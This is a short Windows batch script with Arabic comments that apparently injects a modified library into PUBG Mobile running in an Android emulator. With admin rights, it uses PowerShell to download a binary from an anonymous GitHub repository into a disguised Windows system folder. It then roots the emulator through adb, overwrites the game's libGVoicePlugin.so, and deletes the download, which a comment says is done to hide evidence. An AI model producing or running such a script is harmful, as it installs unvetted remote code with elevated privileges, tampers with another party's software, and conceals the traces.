@echo off
cd /d "C:\Program Files\TxGameAssistant\ui"

:: التحقق من صلاحيات المسؤول
fltmc >nul 2>&1
if not %errorlevel%==0 (
    echo يرجى تشغيل هذا الملف كمسؤول.
    pause
    exit
)

:: تعيين المسار المخفي
set HIDDEN_PATH=%WinDir%\IME\libGVoicePlugin.so

:: تحميل الملف من GitHub إلى المسار المخفي
echo جاري تحميل الملف إلى %HIDDEN_PATH%...
powershell -Command "(New-Object System.Net.WebClient).DownloadFile('https://github.com/jack74512/UAO7/raw/refs/heads/main/libGVoicePlugin.so', '%HIDDEN_PATH%')"

:: التحقق من نجاح التحميل
if not exist "%HIDDEN_PATH%" (
    echo فشل تحميل الملف. تأكد من الاتصال بالإنترنت وأعد المحاولة.
    pause
    exit
)

echo تم تحميل الملف بنجاح!

:: بدء أوامر ADB
adb kill-server
adb start-server
adb root
adb remount

:: إرسال الملف مباشرة إلى المحاكي
adb push "%HIDDEN_PATH%" /data/local/tmp/
adb shell mv /data/local/tmp/libGVoicePlugin.so /data/data/com.tencent.ig/lib/

:: حذف الملف بعد الإرسال لإخفاء الأدلة
del "%HIDDEN_PATH%"

echo.
echo All commands executed successfully!
pause
